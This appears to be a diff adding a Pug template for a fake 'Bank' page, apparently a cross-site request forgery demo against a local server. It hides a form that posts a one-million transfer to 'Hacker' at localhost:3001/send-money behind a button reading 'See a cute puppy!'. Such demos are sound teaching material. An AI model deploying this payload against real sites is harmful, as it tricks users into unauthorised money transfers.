@@ -1,0 +1,27 @@
+doctype html
+html
+  head
+    title Bank
+    style(type="text/css").
+      body {
+        padding: 40px;
+      }
+      form {
+        visibility: hidden;
+      }
+      input[type="submit"] {
+        visibility: visible;
+      }
+
+  body
+
+    block content
+      form(method="post" action="http://localhost:3001/send-money")
+        div
+          label(for='recipient') Recipient:
+          input(type="text" id="recipient" name="recipient" value="Hacker")
+        div
+          label(for='amount') Amount:
+          input(type='number' id='amount' name="amount" value=1000000)
+        input(type='submit' value='See a cute puppy!')
+
